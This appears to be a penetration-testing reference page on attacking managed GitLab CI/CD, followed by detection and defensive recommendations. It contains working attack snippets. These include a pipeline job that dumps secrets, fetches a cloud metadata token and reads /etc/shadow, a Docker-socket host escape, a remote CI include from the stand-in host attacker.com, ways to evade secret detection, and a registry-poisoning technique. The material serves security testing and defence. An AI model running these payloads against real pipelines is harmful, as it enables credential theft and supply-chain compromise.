# Managed GitLab

## Overview

Managed GitLab provides hosted GitLab instances with CI/CD pipelines, runners, container registries, and code management. CI/CD pipeline compromise enables code execution, credential theft, and supply chain attacks.

## Credential Access

### CI/CD Variable Extraction

From a compromised runner (especially shell executor):

```bash
env | grep -iE 'key|secret|token|password|api|credential'
```

**Variable leak vectors:**
- Job logs if variables are **not masked**
- Partial masking failure for short variable values
- Child process environment variable inheritance
- Container layer caches from build stages
- Git history if secrets committed before `.gitignore`

### Runner Host Compromise

**Shell executor** runs CI jobs directly on the runner host as the runner user:
- Full filesystem access
- Access to other jobs' artifacts
- Network access from the host
- Process enumeration and system credentials

**Docker executor** provides some isolation but:
- Docker socket access (if mounted) = host compromise
- Host network mode exposes host services
- Volume mounts may expose host paths

### Secret Detection Bypass

GitLab's built-in secret detection can be evaded:
- Base64 encoding credentials
- Splitting secrets across multiple variables/files
- Using environment variable concatenation
- Storing secrets in binary files

---

## Privilege Escalation

### Pipeline Injection

With repository write access, modify `.gitlab-ci.yml`:

```yaml
stages:
  - build
  - exploit

exploit-job:
  stage: exploit
  script:
    - env  # dump all variables
    - curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
    - cat /etc/shadow 2>/dev/null  # shell executor
```

### Docker Socket Escalation

If the Docker socket is mounted in CI containers:

```yaml
exploit-job:
  image: docker:latest
  services:
    - docker:dind
  script:
    - docker run --privileged -v /:/host ubuntu chroot /host bash -c 'cat /etc/shadow'
```

### Kubernetes Executor Escalation

With Kubernetes executor, jobs run as pods. If RBAC permits:
- Access other pods' services
- Read Kubernetes secrets
- Access the node metadata service

---

## Persistence

### Pipeline Schedule

Create scheduled pipelines for periodic execution:
- Project → CI/CD → Schedules → New schedule
- Set cron expression for periodic code execution

### Webhook-Triggered Pipeline

Register webhooks to trigger pipelines on external events.

### Malicious CI Include

Add a remote include in `.gitlab-ci.yml` that loads from an attacker-controlled URL:

```yaml
include:
  - remote: 'https://attacker.com/ci-template.yml'
```

---

## Lateral Movement

### Registry Poisoning

Push malicious images to the project's container registry:

```bash
docker build -t registry.gitlab.example.com/project/image:latest .
docker push registry.gitlab.example.com/project/image:latest
```

Other projects or services pulling this image will execute the backdoor.

### Cross-Project Triggers

Use CI/CD trigger tokens to start pipelines in other projects.

---

## Security Controls

**Available scanning (Free tier):** SAST, Secret Detection, basic Dependency Scanning.

**Available scanning (Ultimate):** DAST, Container Scanning, API Fuzzing, advanced Dependency Scanning.

**Variable protection mechanisms:**
1. **"Protect variable"** — only available in protected branches
2. **"Mask variable"** — hides value in job logs
3. Both should always be enabled for sensitive variables

---

## Detection

| Event | Source |
|---|---|
| Pipeline execution | GitLab audit events |
| Variable changes | GitLab audit events |
| Runner registration | GitLab admin logs |
| Registry push | Container Registry events |

## Defensive Recommendations

1. Never use shell executor for untrusted code
2. Never mount Docker socket in CI containers — use Kaniko for builds
3. Mark all sensitive variables as both Protected and Masked
4. Enable secret detection in CI pipeline
5. Use signed commits and protected branches
6. Restrict who can modify `.gitlab-ci.yml`
7. Use Kubernetes executor with pod security policies for isolation
